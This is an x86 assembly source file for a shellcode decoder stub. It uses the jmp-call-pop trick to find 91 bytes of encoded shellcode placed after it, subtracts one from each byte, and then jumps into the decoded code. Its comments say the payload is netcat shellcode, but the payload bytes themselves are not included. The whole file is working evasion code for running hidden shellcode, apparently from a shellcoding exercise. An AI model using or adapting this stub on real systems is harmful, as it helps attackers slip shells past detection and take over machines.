section .dcodesub exec
global _start

_start:
  jmp short End

InitDecode:
  pop esi                         ; esi is pointing to shellcode entrypoint
  xor ecx, ecx                    ; zero loop counter
  mov cl, 91                      ; 91d is 5bh (length of netcat encoded shellcode)

Decode:
  sub byte [esi + ecx - 1], 1     ; decode shellcode byte after byte
  sub cl, 1                       ; decrement loop counter
  jnz Decode                      ; decode next byte
  jmp short ShellcodeEntrypoint   ; otherwise, execute decoded shellcode

End:
  call InitDecode

ShellcodeEntrypoint:
